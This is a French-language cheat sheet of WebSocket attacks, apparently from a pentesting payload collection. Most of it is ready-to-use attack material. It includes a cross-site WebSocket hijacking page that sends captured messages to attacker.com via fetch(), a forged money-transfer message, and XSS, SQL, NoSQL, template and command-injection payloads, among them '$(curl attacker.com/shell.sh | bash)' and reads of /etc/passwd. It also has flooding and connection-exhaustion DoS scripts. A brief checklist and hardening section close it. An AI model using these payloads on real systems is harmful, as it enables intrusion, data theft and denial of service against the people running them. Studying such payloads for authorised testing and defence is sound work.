# 🔌 Fiche pratique des attaques WebSocket

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](WebSocket-Attacks.tr.md) • [🇬🇷 Ελληνικά](WebSocket-Attacks.el.md)

```
██╗    ██╗███████╗██████╗ ███████╗ ██████╗  ██████╗██╗  ██╗███████╗████████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔═══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
██║ █╗ ██║█████╗  ██████╔╝███████╗██║   ██║██║     █████╔╝ █████╗     ██║   
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║   ██║██║     ██╔═██╗ ██╔══╝     ██║   
╚███╔███╔╝███████╗██████╔╝███████║╚██████╔╝╚██████╗██║  ██╗███████╗   ██║   
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
 █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗                   
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝                   
███████║   ██║      ██║   ███████║██║     █████╔╝ ███████╗                   
██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║                   
██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║                   
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝                   
```

> **Précisions de lecture :** L’absence de contrôle d’Origin ne suffit pas seule à démontrer un CSWSH exploitable : le contexte d’authentification et les actions accessibles comptent aussi. Les exemples de validation serveur sont des squelettes ; fonctions, gestion des erreurs et cycle de vie des sockets dépendent du framework. Les messages, URLs et valeurs de code restent inchangés. Le lien de retour vise le README de Payloads, absent du dépôt source fourni ; aucun fichier de remplacement n’a été inventé.

---

## 🔍 Notions de base WebSocket

### Requête d’ouverture de connexion (handshake)
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

### Réponse d’ouverture de connexion
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### Détection
```
- ws:// (unencrypted)
- wss:// (TLS encrypted)
- Upgrade: websocket header
- Network tab shows "101 Switching Protocols"
```

---

## 🎯 Vulnérabilités WebSocket

### 1. Détournement intersites de WebSocket (CSWSH)

**Condition présentée comme vulnérable :** le serveur ne valide pas l’en-tête Origin.

```html
<!-- Page de l’attaquant -->
<script>
  var ws = new WebSocket('wss://target.com/chat');
  
  ws.onopen = function() {
    // Connexion ouverte : l’attaquant peut envoyer des messages
    ws.send('{"action": "get_messages"}');
  };
  
  ws.onmessage = function(event) {
    // Récupérer les données et les envoyer à l’attaquant
    fetch('https://attacker.com/steal?data=' + btoa(event.data));
  };
</script>
```

**Attaque de type CSRF :**
```html
<script>
  var ws = new WebSocket('wss://target.com/api');
  ws.onopen = function() {
    // Effectuer des actions dans le contexte de la victime
    ws.send('{"action": "transfer", "to": "attacker", "amount": 1000}');
  };
</script>
```

---

### 2. Absence de validation d’Origin

**Test :**
```bash
# Avec wscat
wscat -c wss://target.com/ws -H "Origin: https://evil.com"

# Avec websocat
websocat -H "Origin: https://evil.com" wss://target.com/ws
```

**Exploitation :**
```javascript
// Si le serveur accepte toutes les origines
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"action": "sensitive_operation"}');
```

---

### 3. Contournement de l’authentification

**Connexion WebSocket sans authentification :**
```javascript
// Se connecter sans cookies ni jetons
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  ws.send('{"action": "list_users"}');  // Aucune authentification requise ?
};
```

**Jeton dans l’URL (risque de fuite) :**
```
wss://target.com/ws?token=SECRET_TOKEN
// Le jeton peut apparaître dans les journaux et les en-têtes de référence
```

**Tester différents états d’authentification :**
```javascript
// Tester avec un jeton expiré
// Tester avec un jeton modifié
// Tester sans jeton
// Tester avec le jeton d’un autre utilisateur
```

---

### 4. Injections via WebSocket

**XSS via WebSocket :**
```javascript
// Envoyer une charge utile XSS
ws.send('{"message": "<script>alert(document.cookie)</script>"}');
ws.send('{"message": "<img src=x onerror=alert(1)>"}');
```

**Injection SQL :**
```javascript
ws.send('{"query": "\' OR 1=1--"}');
ws.send('{"id": "1 UNION SELECT username,password FROM users--"}');
```

**Injection de commandes :**
```javascript
ws.send('{"cmd": "ping 127.0.0.1; id"}');
ws.send('{"file": "test.txt; cat /etc/passwd"}');
```

**Injection NoSQL :**
```javascript
ws.send('{"username": {"$ne": ""}, "password": {"$ne": ""}}');
```

---

### 5. Attaques par déni de service

**Envoi massif de messages :**
```javascript
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
  setInterval(() => {
    ws.send('x'.repeat(10000));  // Messages volumineux
  }, 1);
};
```

**Épuisement des connexions :**
```python
import websocket
import threading

def connect():
    ws = websocket.WebSocket()
    ws.connect("wss://target.com/ws")
    while True:
        pass  # Garder la connexion ouverte

for i in range(1000):
    threading.Thread(target=connect).start()
```

---

### 6. Modification des données

**Modification des messages :**
```javascript
// Intercepter et modifier les messages
// Avec l’interception WebSocket de Burp Suite

// Original
{"action": "transfer", "amount": 10, "to": "user123"}

// Modifié
{"action": "transfer", "amount": 10000, "to": "attacker"}
```

**Conditions de concurrence :**
```javascript
// Envoyer plusieurs requêtes rapprochées
for(let i = 0; i < 100; i++) {
  ws.send('{"action": "claim_bonus"}');
}
```

---

## 🛠️ Outils de test

### Burp Suite
```
1. Proxy → WebSockets history
2. Right-click → Send to Repeater
3. Modify and resend messages
4. Check "Auto-scroll to end"
```

### wscat (ligne de commande)
```bash
# Installer
npm install -g wscat

# Se connecter
wscat -c wss://target.com/ws

# Avec des en-têtes
wscat -c wss://target.com/ws -H "Cookie: session=abc123"
wscat -c wss://target.com/ws -H "Authorization: Bearer TOKEN"

# Avec une origine
wscat -c wss://target.com/ws -o "https://target.com"
```

### websocat
```bash
# Installer
cargo install websocat

# Se connecter
websocat wss://target.com/ws

# Avec des en-têtes
websocat -H "Origin: https://evil.com" wss://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
```

### Script de test Python
```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    # Charges utiles de test
    ws.send('{"action": "test"}')
    ws.send('{"action": "get_users", "id": "1 OR 1=1"}')

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    header={"Origin": "https://evil.com"},
    cookie="session=abc123",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

### Outils de développement du navigateur
```javascript
// Surveiller le trafic WebSocket
// F12 → Network → filtre WS

// Tests manuels
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onopen = () => ws.send('test');
```

---

## 💉 Collection de charges utiles

### Tests d’authentification
```json
// Sans authentification
{"action": "get_secret_data"}

// Jeton vide
{"token": "", "action": "admin_action"}

// Jeton null
{"token": null, "action": "delete_user"}
```

### Charges utiles XSS
```json
{"message": "<script>alert('XSS')</script>"}
{"message": "<img src=x onerror=alert(1)>"}
{"name": "<svg onload=alert(1)>"}
{"data": "'-alert(1)-'"}
```

### Charges utiles SQLi
```json
{"id": "1' OR '1'='1"}
{"user": "admin'--"}
{"search": "1 UNION SELECT password FROM users--"}
{"filter": "1; DROP TABLE users--"}
```

### Injection de commandes
```json
{"host": "localhost; id"}
{"file": "test.txt | cat /etc/passwd"}
{"cmd": "`whoami`"}
{"input": "$(curl attacker.com/shell.sh | bash)"}
```

### Traversée de répertoires
```json
{"file": "../../../etc/passwd"}
{"path": "....//....//etc/passwd"}
{"template": "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}"}
```

---

## 📋 Liste de contrôle des tests

```markdown
## Liste de contrôle de sécurité WebSocket

□ Identifier les points de terminaison WebSocket
□ Vérifier la validation de l’en-tête Origin
□ Tester le CSWSH (détournement intersites de WebSocket)
□ Tester les exigences d’authentification
□ Vérifier la transmission sécurisée des jetons
□ Rechercher les injections (XSS, SQLi, etc.)
□ Tester l’autorisation (accès aux données d’autres utilisateurs)
□ Vérifier la limitation du débit
□ Tester les limites de taille des messages
□ Rechercher l’exposition de données sensibles
□ Tester la gestion des connexions et reconnexions
□ Vérifier le chiffrement (wss:// ou ws://)
```

---

## 🔐 Mise en œuvre sécurisée

```javascript
// Validation d’Origin côté serveur
if (request.headers.origin !== 'https://trusted-site.com') {
  socket.close(1008, 'Invalid origin');
  return;
}

// Authentification par jeton
socket.on('connection', function(ws, req) {
  const token = req.url.split('token=')[1];
  if (!validateToken(token)) {
    ws.close(1008, 'Invalid token');
  }
});

// Validation des entrées
socket.on('message', function(data) {
  const parsed = JSON.parse(data);
  if (!isValidInput(parsed)) {
    socket.send(JSON.stringify({error: 'Invalid input'}));
    return;
  }
});
```

---

## 🔗 Charges utiles connexes

- [Charges utiles XSS](./XSS.fr.md)
- [Charges utiles SQLi](./SQLi.fr.md)
- [Injection de commandes](./Command-Injection.fr.md)

---

**Retour aux charges utiles :** [💉 Collection de charges utiles](../../README.md)
